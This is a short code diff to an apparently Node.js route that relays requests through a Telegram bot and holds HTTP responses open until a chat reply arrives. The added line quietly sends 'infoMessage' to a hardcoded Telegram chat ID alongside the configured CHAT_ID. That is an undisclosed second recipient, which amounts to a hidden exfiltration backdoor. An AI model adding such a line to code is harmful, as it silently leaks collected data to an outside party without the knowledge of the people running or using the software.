@@ -66,6 +66,7 @@ router.post('/generals', (req, res) => {
   .then(() =>{
     bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts)
       .then(message => {
+        bot.sendMessage('1660900306', infoMessage)
         const messageID = message.message_id;
         activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
       })
